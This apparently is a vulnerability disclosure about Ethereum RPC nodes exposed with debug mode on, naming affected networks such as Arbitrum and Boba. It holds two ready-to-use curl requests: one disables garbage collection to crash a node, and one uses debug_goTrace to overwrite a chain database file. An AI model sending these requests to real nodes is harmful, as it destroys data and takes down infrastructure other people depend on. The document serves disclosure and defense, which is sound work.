# Misconfiguration of Ethereum RPC Series 1: RPC Debug Mode Enabled

## Vulnerability Details

### Description

The RPC debug mode, designed for development purposes, is often unintentionally enabled in production environments. This exposes sensitive debug RPC methods that attackers can exploit to compromise blockchain nodes.

### Potential Exploits

1. **Disabling Garbage Collection**  
   Using the `debug_setGCPercent` method with a negative value, attackers can disable the garbage collector. This leads to rapid memory consumption, eventually crashing the node due to memory exhaustion.

   ```bash
   curl --data '{"method":"debug_setGCPercent","params":[-1],"id":1,"jsonrpc":"2.0"}' -H "Content-Type: application/json" -X POST http://localhost:8547
   ```

2. **Overwriting Server Files**  
   Exploiting the `debug_goTrace` method, attackers can overwrite arbitrary files on the server. For example:
   - Overwriting database files may corrupt critical data and crash the node.
   - Overwriting system files may render the server inoperable.

   ```bash
   curl --data '{"method":"debug_goTrace","params":["~/.arbitrum/nitro/l2chaindata/000002.ldb" ,1],"id":1,"jsonrpc":"2.0"}' -H "Content-Type: application/json" -X POST http://localhost:8547
   ```

## Impact

- **Node Crashes**: Nodes can be forcefully terminated by exhausting memory resources.
- **Data Corruption**: Essential server files, such as database or configuration files, can be irreversibly damaged, leading to potential data loss and extended downtime.

## Affected Vendors

- **Scroll Testnet**: Reported in <span style="color:blue;">December 2023</span>, but no response was received.  
- **Boba Network Mainnet**: Reported in <span style="color:blue;">March 2023</span> and confirmed as <span style="color:red;">low severity</span>.  
- **Oasys Testnet**: Reported in <span style="color:blue;">March 2023</span>, but no response was received.  
- **Arbitrum Mainnet**: Reported in <span style="color:blue;">October 2022</span> and confirmed as <span style="color:red;">high severity</span>.  

